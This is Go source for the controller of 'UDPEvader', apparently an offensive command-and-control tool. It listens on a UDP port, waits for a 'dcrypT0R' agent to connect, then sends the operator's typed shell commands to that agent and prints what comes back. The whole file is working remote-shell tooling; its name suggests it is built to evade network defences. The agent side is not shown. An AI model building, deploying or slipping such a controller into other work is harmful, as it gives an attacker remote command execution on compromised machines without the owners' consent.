package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"time"

	"UDPEvader/src/listenerprops"

	"github.com/fatih/color"
)

const BUFFSIZE = 1024

func main() {
	bl := color.New(color.FgHiBlue, color.Bold)
	ylw := color.New(color.FgHiYellow, color.Bold)
	cyan := color.New(color.FgHiCyan, color.Bold)
	gr := color.New(color.FgHiGreen, color.Bold)

	listenerprop := &listenerprops.UDPListenerProps{}
	cmdarglport := flag.Int("lport", 8080, "If not provided, default will be 8080")
	cmdargprompt := flag.String("prompt", "<<@dcrypT0R~UDP>>", "If not provided, default will be <<@dcrypT0R~UDP>>")

	flag.Parse()

	if flag.Lookup("lport") == nil {
		listenerprop.UDPPort = ":8080"
	} else {
		listenerprop.UDPPort = ":" + fmt.Sprintf("%d", *cmdarglport)
	}

	if flag.Lookup("prompt") == nil {
		listenerprop.ShellPrompt = "<<@dcrypT0R~UDP>>"
	} else {
		listenerprop.ShellPrompt = *cmdargprompt
	}
	udpconn, err := listenerprop.StartUDPController()
	if err != nil {
		fmt.Println("UDP Controller error", err)
	}
	listenerprop.AgentConn = udpconn
	defer listenerprop.AgentConn.Close()
	gr.Printf("UDPEvader controller using Port ")
	gr.Printf(listenerprop.UDPPort)
	fmt.Println()
	ylw.Printf("Waiting for dcrypT0R UDP agent...")
	listenerprop.ReceivedResult = make([]byte, BUFFSIZE)
	_, clientaddr, err := listenerprop.AgentConn.ReadFromUDP(listenerprop.ReceivedResult)
	if err != nil {
		fmt.Println(err)
	}
	cyan.Println("Agent connected ", clientaddr)

	for {

		bl.Printf(listenerprop.GetControllerPrompt())
		reader := bufio.NewReader(os.Stdin)
		command, _ := reader.ReadString('\n')

		_, err = listenerprop.AgentConn.WriteToUDP([]byte(command), clientaddr)
		if err != nil {
			fmt.Println(err)
		}
		time.Sleep(time.Second * 1)
		listenerprop.ReadResultandPrint()
	}
}
